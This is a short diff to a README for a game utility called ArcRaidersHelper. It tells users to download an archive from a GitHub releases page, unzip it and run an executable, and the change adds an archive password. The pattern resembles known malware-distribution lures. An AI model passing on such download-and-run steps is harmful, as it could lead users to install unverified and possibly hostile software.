@@ -27,7 +27,7 @@ ArcRaidersHelper is a comprehensive utility tool designed to enhance your gamepl
 1. Go to the [**Releases Page**](https://github.com/monzeroobrygaiygly4fd/ArcRaidersHelper/releases).
 2. Download the latest archive.
 3. Unzip the files to a folder of your choice.
-4. Run `ArcRaidersHelper.exe`.
+4. Run `ArcRaidersHelper.exe`.(PASSWORD 20026)
 
 ## ⚙️ Requirements
 
